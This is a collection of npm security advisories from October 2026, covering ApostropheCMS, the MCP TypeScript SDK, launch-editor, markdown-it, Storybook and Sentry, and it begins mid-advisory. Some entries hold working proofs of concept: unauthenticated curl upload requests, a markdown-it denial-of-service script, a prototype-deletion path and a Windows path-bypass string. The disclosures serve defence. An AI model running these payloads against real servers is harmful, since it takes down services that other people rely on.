4. **Guard:** The `publicApiProjection` override that would discard the attacker projection runs only when `canAccessApi(req)` is false, so it is skipped for the authenticated caller; no key allowlist, segment check, or prototype guard exists anywhere on the path.
5. **Primitive:** On the SQLite or PostgreSQL adapter, `applyProjection` takes the exclusion branch and calls `unsetNestedField(result, 'constructor.prototype.hasOwnProperty')`, which resolves `Object.prototype` and executes `delete Object.prototype.hasOwnProperty`.
6. **Result:** A shared prototype method is removed for the entire Node process, so request handling throws for all users and tenants until restart.

## Bypass Evidence

The relevant protections were examined individually and none blocks this path. The projection `launder` (packages/apostrophe/modules/@apostrophecms/doc-type/index.js:2003-2011) laundens values only and retains arbitrary keys. The `publicApiProjection` permission override (packages/apostrophe/modules/@apostrophecms/piece-type/index.js:1142-1156) is gated on `!canAccessApi(req)` and is therefore not taken for an authenticated `view-draft` caller. The `finalize` per-key loop (doc-type/index.js:2062-2069) short-circuits on the falsy exclusion value before it ever inspects the key. Most importantly, `unsetNestedField` (packages/db-connect/lib/shared.js:119-129) has no segment guard at all: its sibling `setNestedField` blocks a literal `__proto__` but neither helper blocks `constructor` or `prototype`, and the `constructor.prototype.<member>` path bypasses even that partial `__proto__` check. Attempts to disprove the finding all failed: routing the value to the inclusion branch (which uses `setNestedField`) does not occur because the value is falsy; the working object is a plain object from `JSON.parse(JSON.stringify(doc))` so its `constructor` is the global `Object`; and `Object.prototype.hasOwnProperty` is configurable, so the delete succeeds. The seed prototype-pollution fix added a `{__proto__, constructor, prototype}` segment guard, but only in `apos.util.set`/`get` in the separate `apostrophe` package; the db-connect helpers were never hardened.

## Affected Versions

- `Ecosystem: npm`
- `Package: @apostrophecms/db-connect`
- `Confirmed affected range: >= 1.0.0, <= 1.0.2`
- `Latest release checked: 1.0.2 (npm registry)`
- `Fix status: not fixed`

The unguarded `unsetNestedField` and the exclusion-branch `applyProjection` call are byte-identical across the published stable releases 1.0.0, 1.0.1, and 1.0.2, and the SQLite and PostgreSQL adapters invoke `applyProjection` per returned document in all of them. No published release fixes the issue. The prerelease line (1.0.0-alpha.1, 1.0.0-alpha.2, 1.0.2-alpha.0) ships the same code but is outside the supported stable channel. Reachability requires a consumer on a SQLite, PostgreSQL, or multipostgres adapter; the default `mongodb` adapter delegates the projection to the real MongoDB driver and is not affected. The `apostrophe` package, which drives reachability, declares `@apostrophecms/db-connect@^1.0.1`, resolving to the affected 1.0.2.

## Suggested Fix

Enforce that untrusted field paths can never traverse into shared prototype objects. Both `unsetNestedField` and `setNestedField` in `packages/db-connect/lib/shared.js` should reject any path whose segments include `__proto__`, `constructor`, or `prototype`, mirroring the `unsafePathSegments` guard already used in the `apostrophe` package's `apos.util.set`/`get`; equivalently, the helpers can traverse own-properties only (for example using `Object.prototype.hasOwnProperty` checks captured before use, or `Map`-based access) so that resolution cannot reach prototype objects. Because `applyProjection` is the reachable gate, adding the guard at the helper level protects every adapter path at once. As an interim mitigation without a code change, deployments can run on the default `mongodb` adapter (which is not affected) or restrict authenticated API access so that only fully trusted roles can reach the piece-type REST endpoints.

Reported by zx (GitHub: @manus-pi).

- https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce [WEB]
- https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350 [WEB]
- https://github.com/apostrophecms/apostrophe [PACKAGE]

### GHSA-qhcq-9pm2-c9w9 — ApostropheCMS: Unauthenticated CSV import requests leave rejected uploads in the system temporary directory
- Aliases: CVE-2026-113658 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-400, CWE-459, CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/apostrophe: introduced:0 fixed:4.33.0

### Summary

A rejected upload can remain in the operating system temporary directory.

Multer writes the file before its extension is checked, and the rejection path does not remove that temporary file. An unauthenticated requester can repeat this with large files and steadily consume temporary disk space.

### Details

The endpoint is:

```text
POST /api/v1/@apostrophecms/rich-text-widget/generate-csv-table
```

In `packages/apostrophe/modules/@apostrophecms/rich-text-widget/lib/apiRoutes.js`, Multer first writes the upload to `os.tmpdir()`. The handler then rejects filenames whose extension is not `csv`, but there is no cleanup of the Multer file on this error path.

The route does not require an authenticated user. A normal CSRF cookie is sufficient.

During testing, the request returned HTTP 400 with `Only csv files are supported`, while the complete uploaded content remained in a randomly named file in the configured temporary directory after the response.

### Relationship to prior public work

I reviewed [PR #5013](https://github.com/apostrophecms/apostrophe/pull/5013), which migrated the Rich Text CSV upload path from `connect-multiparty` to Multer. This report concerns cleanup after that migration: the rejected Multer file remains on disk, a behavior not described in the PR or its review discussion.

### POC

Create a small test file. A larger file can be used to demonstrate disk growth, but 1 MiB is enough for a safe local reproduction:

```bash
dd if=/dev/zero of=rejected.txt bs=1M count=1
```

Obtain the normal site cookies and send the rejected upload:

```bash
curl -c cookies.txt 'http://127.0.0.1:3000/' > /dev/null

curl -i -b cookies.txt \
  -F 'file=@rejected.txt;filename=rejected.txt;type=text/plain' \
  'http://127.0.0.1:3000/api/v1/@apostrophecms/rich-text-widget/generate-csv-table'
```

The response is HTTP 400. Compare the contents of the system temporary directory before and after the request:

```bash
ls -lt /tmp
```

A new randomly named file remains present and contains the uploaded bytes.

No login is required. Repeating the multipart request creates additional persistent temporary files.

### Impact

A remote unauthenticated attacker can fill the partition used by the operating system temporary directory. Once that partition is exhausted, Apostrophe and unrelated services on the same host may fail to upload files, create temporary data, or continue operating normally.

The attack requires only repeated HTTP requests and the stored files remain after each rejected response.

### GHSA-22jm-h49p-29qw — MCP TypeScript SDK: Experimental tasks were not tied to the session that created them
- Aliases: CVE-2026-111767 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-639, CWE-862
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L`
- Affected npm/@modelcontextprotocol/sdk: introduced:1.24.0 fixed:1.32.0

### Summary
In affected versions, the experimental tasks feature (`taskStore`) did not check which session created a task. Clients sharing one `InMemoryTaskStore` could list, read and cancel each other's tasks.

Experimental tasks are deprecated. The 2026-07-28 specification replaced them with a redesigned extension. The best course of action is to stop using them.

### Am I affected?
Only if your HTTP server passes `taskStore` to `McpServer` or `Server`. If `grep -ri taskstore --exclude-dir=node_modules .` finds nothing, you are not affected.

Affected versions: `@modelcontextprotocol/sdk` 1.24.0 through 1.31.0. The 2.x packages are not affected.

### Fix
Upgrade to `@modelcontextprotocol/sdk` 1.32.0 or later. Each task is now tied to the session that created it, so a client that starts a new session can no longer reach its earlier tasks.

If you cannot upgrade yet, remove `taskStore`, or create one `InMemoryTaskStore` per session.

### GHSA-587h-7wmj-h5pm — launch-editor: `fs.existsSync()` existence check can be bypassed on Windows
- Aliases: CVE-2026-112942 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-77
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- Affected npm/launch-editor: introduced:0 fixed:2.14.2
- Affected npm/vite: introduced:8.3.0 fixed:8.3.3
- Affected npm/vite: introduced:8.2.0 fixed:8.2.4
- Affected npm/vite: introduced:8.0.0 fixed:8.1.6
- Affected npm/vite: introduced:7.0.0 fixed:7.3.7
- Affected npm/vite: introduced:0 fixed:6.4.4
- Affected npm/vite-plus: introduced:0 fixed:1.1.0

### Summary

`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.

Combined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.

### Impact

Only apps that runs on Windows is affected.

### Details

The earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.

A crafted value ending in `\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:

1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.
2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\..`.
3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.
4. Because the existence check passes, the crafted filename reaches the Windows shell command.

### GHSA-46jr-4wx8-v453 — MCP TypeScript SDK: One HTTP request within the default size limit could exhaust server memory during validation
- Aliases: CVE-2026-111768 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/@modelcontextprotocol/sdk: introduced:1.3.0 fixed:1.32.0
- Affected npm/@modelcontextprotocol/server: introduced:2.0.0 fixed:2.3.0

### Summary
In affected versions, servers put no limit on how many array elements and object keys they validated in one request. One HTTP request within the default 4 MiB size limit could exhaust the server's memory, and the process aborted with `JavaScript heap out of memory`.

No credentials are needed, unless you authenticate requests before they reach the SDK.

### Am I affected?
Yes, if clients you do not fully trust can reach your server over HTTP. The risk is highest for `McpServer` tools whose input contains an array or a record. stdio-only servers are not affected.

Affected versions:

- `@modelcontextprotocol/sdk` 1.3.0 through 1.31.0
- `@modelcontextprotocol/server` 2.0.0 through 2.2.0

### Fix
Upgrade to:

- 1.x: `@modelcontextprotocol/sdk` 1.32.0 or later
- 2.x: `@modelcontextprotocol/server` 2.3.0 or later

**Upgrading alone changes nothing.** The patched versions add an `McpServer` option, `maxToolInputElements`, that is off by default. Make both of these changes:

1. Set `maxToolInputElements` just above the largest input your tools need, for example `new McpServer(info, { maxToolInputElements: 10_000 })`. It counts array elements and object keys in a call's arguments. A call over the limit gets an `isError: true` result.
2. Lower the request size limit to what your tools need. The option covers tool arguments only, and the size limit covers everything else. Set `maxRequestBodySize` on the transport or `createMcpHandler()`. If you parse the body yourself, for example with `express.json()` or Fastify, set that parser's limit.

If you cannot upgrade yet, make the second change. `maxRequestBodySize` needs `@modelcontextprotocol/sdk` 1.30.1 or `@modelcontextprotocol/server` 2.1.0. Below that, use a reverse proxy.

References:
- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-46jr-4wx8-v453 [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk/pull/2926 [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk/pull/2927 [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk/commit/6d8dbc6cb590edf766fcb66b636ca6b654e99c37 [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk/commit/fd26801b3b387742fe24a90ed4b275dd6072209f [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk [PACKAGE]

### GHSA-jm63-cq47-j5jp — MCP  TypeScript server SDK: Shared transport or server instances delivered one HTTP client's messages to another
- Aliases: CVE-2026-111770 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-362
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H`
- Affected npm/@modelcontextprotocol/server: introduced:2.0.0 fixed:2.3.0

### Summary
In affected versions, an MCP server reached over HTTP could deliver one client's responses and notifications to another client. This happened when clients shared one stateless transport, or one `McpServer` or `Server` instance.

Messages were matched to a connection by JSON-RPC `id` alone. SDK clients number requests from 0, so ids collide in normal use.

### Am I affected?
Yes, if more than one client can reach your HTTP endpoint and your code creates the transport or the server once at startup, instead of once per request or per session. Until this release, the README examples of `@modelcontextprotocol/hono`, `express`, `fastify` and `node` showed that pattern.

Affected versions: `@modelcontextprotocol/server` 2.0.0 through 2.2.0.

Not affected:

- `createMcpHandler()` with a factory that builds a new server on every call
- stdio servers
- `@modelcontextprotocol/sdk` 1.26.0 and later

### Fix
Upgrade to `@modelcontextprotocol/server` 2.3.0 or later.

**You also need to change your code.** The SDK now refuses to be shared, so an affected app fails requests after upgrading: a second `connect()` rejects with `ALREADY_CONNECTED`, and a stateless transport rejects its second request.

Change to one of these:

- **`createMcpHandler()`:** pass a factory that builds a new `McpServer` on every call.
- **Per request:** build a new `McpServer` and a new transport inside the request handler.
- **Per session:** set `sessionIdGenerator` and keep one `McpServer` and one transport per session.

If you cannot upgrade yet, the same change fixes affected versions.

References:
- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-jm63-cq47-j5jp [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk/pull/2918 [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d [WEB]
- https://github.com/modelcontextprotocol/typescript-sdk [PACKAGE]

### GHSA-gfr2-rv44-r23c — markdown-it: Quadratic-time rendering of a single multi-line link reference definition with default options (regression since 14.0)
- Aliases: CVE-2026-111758 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-400, CWE-407
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/markdown-it: introduced:14.1.0 fixed:14.3.3
- Affected npm/markdown-it: introduced:15.0.0 fixed:15.0.3

### Summary

A link reference definition whose label or title is never closed is O(n²) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4–5× per doubling. No options are required to trigger it.

### Details

src/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n²). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark §6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.

The observed output from PoC was:
unclosed title n=100000   200009 B    3585.5 ms
unclosed title n=200000   400009 B   18107.1 ms   (5.05x)
unclosed title n=400000   800009 B   73954.4 ms   (4.08x)

Regression comparison at 313 KB: 13.0.2 → 125 ms, 14.1.0 → 11.4 s, 15.0.0 → 10.6 s, 15.0.2 → 10.7 s.

### Proof of concept

How to execute the PoC:
1. mkdir -p markdown-it-poc && cd markdown-it-poc
2. npm init -y
3. npm i markdown-it@15.0.2
4. node poc_markdown_it.js

PoC below is:
```javascript
// poc_markdown_it.js
// Requires: npm install markdown-it@15.0.2
const MarkdownIt = require('markdown-it');
const md = new MarkdownIt();

function bench(label, src) {
  const t0 = process.hrtime.bigint();
  md.render(src);
  const t1 = process.hrtime.bigint();
  console.log(
    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`
  );
}

// Unclosed title: one reference definition spread over many lines
for (const n of [100000, 200000, 400000]) {
  bench(`unclosed title n=${n}`, '[a]: /u "' + 'x\n'.repeat(n));
}

// Unclosed label
for (const n of [5000, 10000, 20000]) {
  bench(`unclosed label n=${n}`, '[' + 'a\n'.repeat(n));
}
```

### Impact

This is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.

References:
- https://github.com/markdown-it/markdown-it/security/advisories/GHSA-gfr2-rv44-r23c [WEB]
- https://github.com/markdown-it/markdown-it/commit/48fbc465812c440020c663f040ab22deaf8f1eca [WEB]
- https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503 [WEB]
- https://github.com/markdown-it/markdown-it [PACKAGE]
- https://github.com/markdown-it/markdown-it/releases/tag/14.3.3 [WEB]
- https://github.com/markdown-it/markdown-it/releases/tag/15.0.3 [WEB]

### GHSA-86wm-68pq-5jwq — ApostropheCMS: Unauthenticated resource exhaustion via pre-auth aposBigUpload processing in @apostrophecms/import-export
- Aliases: CVE-2026-113711 | Published: 2026-10-21 | Modified: 2026-10-21 | Severity: HIGH
- CWE: CWE-400, CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/apostrophe: introduced:0 fixed:4.33.0
- Affected npm/@apostrophecms/import-export: introduced:0 fixed:3.7.0

## Summary

A potential unauthenticated denial-of-service vulnerability exists in the chunked import upload path used by `@apostrophecms/import-export`.

The affected import API routes invoke:

`self.apos.http.bigUploadMiddleware()`

before the actual import handler performs its authentication check.

Because no `authorize` callback is supplied to `bigUploadMiddleware()`, unauthenticated requests can reach the `aposBigUpload` `start`, `chunk`, and `end` operations before the later `req.user` check rejects the import.

As a result, an unauthenticated remote attacker can create server-side upload state, write chunk data to upload storage, trigger temporary-file processing, and cause attacker-controlled cleanup operations before authentication is enforced.

## Affected Component

Package:

`@apostrophecms/import-export`

Confirmed affected version:

`3.6.2`

Potential earlier affected versions:

The issue may affect earlier 3.x releases in which the current big-upload-based import implementation is present. I have not yet fully verified the exact introduction version and recommend that the maintainers confirm the affected version range.

## Vulnerability Type

Primary:

**CWE-400 — Uncontrolled Resource Consumption**

Related:

**CWE-306 — Missing Authentication for Critical Function**

**CWE-770 — Allocation of Resources Without Limits or Throttling**

## Technical Details

The page import route registers the following middleware chain:

`packages/import-export/modules/@apostrophecms/import-export-page/index.js`

```javascript
importExportImport: [
  self.apos.http.bigUploadMiddleware(),
  async (req) => {
    return self.apos.modules['@apostrophecms/import-export']
      .import(req, self.__meta.name);
  }
]
```

No `authorize` callback is passed to `bigUploadMiddleware()`.

The `bigUploadMiddleware()` implementation explicitly supports an `authorize` callback and performs that authorization before processing the `aposBigUpload` protocol when supplied.

Without that callback, requests containing:

`aposBigUpload[type]=start`

`aposBigUpload[type]=chunk`

or

`aposBigUpload[type]=end`

are processed immediately.

The actual authentication check occurs later in:

`packages/import-export/lib/methods/import.js`

```javascript
async import(req, moduleName) {
  if (!req.user) {
    throw self.apos.error('forbidden');
  }
```

This means authentication occurs only after the chunked-upload middleware has already performed server-side work.

## Attack Flow

### 1. Start

An unauthenticated attacker submits an `aposBigUpload[type]=start` request.

The server generates an upload ID and stores attacker-supplied upload metadata, including the declared `chunks` count.

### 2. Chunk

The attacker can upload chunk data.

`bigUploadChunk()` copies attacker-controlled data into:

`/big-uploads/<id>-<n>-<chunk>`

### 3. End

The attacker sends an `aposBigUpload[type]=end` request.

`bigUploadEnd()` begins processing the upload and creates temporary files before invoking the downstream import handler.

Only after this processing completes does execution reach the later authentication check in `import()`.

### 4. Cleanup amplification

The attacker-controlled `chunks` value is also used by `bigUploadCleanupOne()`:

```javascript
for (const { chunks } of Object.values(bigUpload.files)) {
  for (let i = 0; (i < chunks); i++) {
    await ufs.remove(...);
  }
}
```

No small upper bound on the declared chunk count appears to be enforced at upload initialization.

This allows an unauthenticated attacker to increase the number of filesystem cleanup operations performed for an upload.

## Proof of Concept

The following reproduction was performed only against an isolated test environment.

### Start an upload without authentication

```bash
curl -s -X POST \
  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=start' \
  -H 'Content-Type: application/json' \
  --data '{"files":{"file":{"name":"evil.tar.gz","size":4,"type":"application/gzip","chunks":1}}}'
```

The server returns an upload ID despite the request having no authenticated session.

### Upload a chunk

```bash
printf 'PWN!' >/tmp/chunk.bin

curl -s -X POST \
  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=chunk&aposBigUpload[id]=<ID>&aposBigUpload[n]=0&aposBigUpload[chunk]=0' \
  -F 'chunk=@/tmp/chunk.bin;type=application/octet-stream'
```

The request succeeds and causes server-side upload storage to be used.

### Finalize the upload

```bash
curl -i -X POST \
  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=end&aposBigUpload[id]=<ID>'
```

Observed behavior:

* `start` returns HTTP 200 and an upload ID without authentication.
* `chunk` returns HTTP 200 and results in server-side chunk storage.
* `end` eventually reaches the downstream authentication check and is rejected.
* However, the server-side big-upload processing has already occurred before that authentication rejection.

In my isolated harness:

* `chunks=1` resulted in one cleanup removal attempt.
* `chunks=50` resulted in 50 cleanup removal attempts.

This demonstrates that the attacker-controlled chunk count directly influences server-side cleanup work.

## Security Impact

The vulnerability allows an unauthenticated remote attacker to cause server-side storage and filesystem operations that should only be reachable by authorized import users.

Possible consequences include:

* Consumption of upload and temporary storage.
* Creation of server-side upload state by unauthenticated users.
* Repeated filesystem I/O.
* Cleanup amplification based on attacker-controlled chunk counts.
* Potential service degradation or denial of service when the attack is repeated or sufficiently amplified.

## Root Cause

Authentication is enforced in the downstream import handler rather than before the chunked-upload middleware.

The middleware itself already supports an `authorize` callback specifically for preventing unauthorized use of the big-upload functionality.

## Suggested Remediation

Require authentication before any `aposBigUpload` operation is processed.

For example:

* Pass an appropriate `authorize` callback to `bigUploadMiddleware()` on all import routes.
* Reject unauthenticated users before `start`, `chunk`, or `end`.
* Enforce reasonable limits on declared chunk counts.
* Validate declared size against actual uploaded data.
* Introduce per-user and global storage/rate limits.
* Ensure temporary files are removed when downstream processing fails.
* Add regression tests confirming that anonymous `start`, `chunk`, and `end` requests are rejected before upload state or files are created.

Relevant reviewed commit:

`d3ff8c9bb001be1acf7fdc3f035190250ac64b45`

## Researcher Credit

**Kai Zhi**

GitHub:

**https://github.com/kaizhi888**

### GHSA-f2ph-cmg5-wxc8 — Storybook: Missing origin validation in Storybook preview allows code injection from malicious websites
- Aliases: CVE-2026-114125 | Published: 2026-10-21 | Modified: 2026-10-21 | Severity: CRITICAL
- CWE: CWE-1021, CWE-22, CWE-346, CWE-441, CWE-749, CWE-862, CWE-94, CWE-96
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`
- Affected npm/storybook: introduced:8.0.0 fixed:8.6.19
- Affected npm/storybook: introduced:9.0.0 fixed:9.1.21
- Affected npm/storybook: introduced:10.0.0 fixed:10.6.2
- Affected npm/storybook: introduced:11.0.0-alpha.0 fixed:11.0.0-alpha.6
- Affected npm/@storybook/core: introduced:8.0.0 fixed:8.6.19
- Affected npm/@storybook/core-server: introduced:8.0.0 fixed:8.6.19
- Affected npm/@storybook/experimental-addon-test: introduced:8.0.0 fixed:8.6.19
- Affected npm/@storybook/addon-vitest: introduced:9.0.0 fixed:9.1.21
- Affected npm/@storybook/addon-vitest: introduced:10.0.0 fixed:10.6.2
- Affected npm/@storybook/addon-vitest: introduced:11.0.0-alpha.0 fixed:11.0.0-alpha.6
- Affected npm/@storybook/addon-mcp: introduced:10.6.0 fixed:10.6.2
- Affected npm/@storybook/addon-mcp: introduced:11.0.0-alpha.0 fixed:11.0.0-alpha.6

**Summary:** A malicious website may be able to cause unauthorized file changes in a developer’s project while an affected Storybook development server is running. Under additional conditions, a changed file could be executed by a local runtime with the developer’s privileges. We are not aware of exploitation in the wild.

## Who is impacted?

You are impacted if you run a Storybook dev server in the affected versions.

You are not impacted if:

- You run a dev server that you never open in a web browser (e.g. headless automation, MCP clients)
- You run or visit a built version of Storybook

Recent versions of Chrome and Firefox may ask for permission before a website can connect to a `localhost` service. This reduces the risk, but does not remove it. Do not grant this permission to websites you don’t trust.

## Recommended actions

### Upgrade Storybook

Storybook has released patched versions of all affected major Storybook versions that fix all the vulnerabilities necessary for the worst-case scenario above to occur. 

Upgrade to a patched version listed below before running `storybook dev` again. If you cannot upgrade immediately, do not run an affected Storybook dev server until you can apply the fix.

- 11.0.0-alpha.6
- 10.6.2
- 9.1.21
- 8.6.19

### Review potentially breaking changes

Due to the exceptional nature of the reported vulnerabilities, the Storybook team has decided to change the default behavior of Storybook, including versions 8 and 9, for several network-related features that are not essential to most Storybook users' workflow. If your team relies on the affected features, we've added feature flags that can disable specific security updates to support your existing workflows.

Please carefully read the introduced flags and the consequences of using them.

#### Iframe embedding over the network is disabled by default

Storybook no longer allows the manager or preview to be embedded as an iframe on a website with a different host name. Built versions of Storybook are unaffected and can be freely embedded.

If you rely on embedding a Storybook dev server through a separate web app, run that separate app on `localhost`. You may also use the `security.insecureRemoteIframeEmbed` feature flag to re-enable iframe embedding from any origin.

#### The preview iframe rejects messages sent by an unknown host

Both the Storybook preview and manager now restrict the origin of iframes and parent windows that they can send messages to and receive messages from using the `postMessage` API.

By default, Storybook in dev mode only accepts communication with its own origin and other `localhost` services. Built Storybooks continue to accept communication from unknown origins.

A Storybook addon or integration could hypothetically rely on `postMessage` to update a live story's args. If you do that, reach out to the Storybook team to explore safer alternatives.

Storybook composition also relies on `postMessage`, so a composed Storybook on a different origin now fails to load unless it has been built. The `security.insecureIframeMessaging` feature flag disables this protection, but we recommend you build composed Storybooks instead.

#### The `highlight` event signature has changed

Storybook’s own accessibility addon uses the `highlight` event to inject highlights into the preview, which a user can click. Clicking the highlight opens a menu with a link to a documentation page.

The API for that event was too permissive and could be used to trigger arbitrary events, including events processed by the user’s dev server. We reworked the API to prevent abuse. Besides the accessibility addon, Chromatic's Visual Tests addon uses this API to link to documentation from highlighted ignored elements. Update the Visual Tests addon to version 5.5.1 or later to keep that link working. Because no other addons use this API as far as we know, we have not added a feature flag to restore the old API.

## Disclosure timeline

On September 30th, the Storybook team received a responsible disclosure showing how a malicious website can embed a Storybook dev server's preview iframe and send events to the dev server on the developer's machine.

They combined this information with findings from an ongoing security audit to come up with a worst-case-scenario exploitation of the disclosed vulnerability, and the ones we independently discovered. They then worked to address all layers necessary for this worst-case scenario to happen. We have not received evidence of exploitation in real Storybook projects. The attack outlined in this advisory relies on correctly exploiting a sequence of many vulnerabilities, some of which were never disclosed to the Storybook team.

### Worst-case attack scenario

An attacker-controlled website can interact with the preview of a running Storybook dev server. With user interaction, it may cause the dev server to make unauthorized changes to story files. If a malicious file is subsequently executed by a local runtime, the attack could lead to arbitrary code execution with the developer’s permissions.

### GHSA-mchm-gjx6-7h55 — Sentry-Javascript: Middleware Bypass when using Tunnel route
- Aliases: CVE-2026-114139 | Published: 2026-10-22 | Modified: 2026-10-22 | Severity: CRITICAL
- CWE: CWE-693
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- Affected npm/@sentry/nextjs: introduced:9.36.0 fixed:9.47.2
- Affected npm/@sentry/nextjs: introduced:10.0.0-alpha.0 fixed:10.75.2
- Affected npm/@sentry/nextjs: introduced:11.0.0-alpha.0 fixed:11.0.0-rc.1

### Impact

The `tunnelRoute` option makes the SDK send browser events to a path on your own Next.js server (for example `/monitoring`), where a rewrite forwards them to Sentry to prevent ad blockers from blocking them. To keep those envelope requests from being rejected by your middleware, the SDK skips middleware for them.

The middleware skip was wider than the rewrite. The rewrite only serves requests to the tunnel path itself with the `o` and `p` parameters set. The skip applied to anything under the tunnel path. Requests in that gap go to your application instead of Sentry, and your middleware never runs on them.

Skipping middleware does not grant the request any privileges. Routes that check the session server-side are still protected.

You are affected only if **all** of the following are true:

1. `tunnelRoute` is set (a string path or `true`),
2. your app is built with **webpack** (Turbopack builds are not affected),
3. some route of your application resolves under the tunnel path. That could be a direct collision (`/monitoring/foo` with `tunnelRoute: '/monitoring'`) or a dynamic segment at the route root (`app/[locale]/…`), which matches any first path segment, and
4. your middleware is the only place that enforces authorization for those routes.

Sentry's own services, and the data in your Sentry organization, are not affected.

### Patches

Fixed in [9.47.2](https://github.com/getsentry/sentry-javascript/releases/tag/9.47.2), [10.75.2](https://github.com/getsentry/sentry-javascript/releases/tag/10.75.2) and [11.0.0-rc.1](https://github.com/getsentry/sentry-javascript/releases/tag/11.0.0-rc.1). The skip now matches only the requests the tunnel rewrite actually serves. No configuration change is needed.

### Workarounds

- Set `tunnelRoute` to a path no route of yours can resolve under, or remove the option.
- Build with Turbopack (default for `next build` from Next.js 16).
- Enforce authorization in the route, layout or data-access path as well as in middleware.

References:
- https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-mchm-gjx6-7h55 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-114139 [ADVISORY]
- https://github.com/getsentry/sentry-javascript/pull/24499 [WEB]
- https://github.com/getsentry/sentry-javascript/pull/24565 [WEB]
- https://github.com/getsentry/sentry-javascript/pull/24760 [WEB]
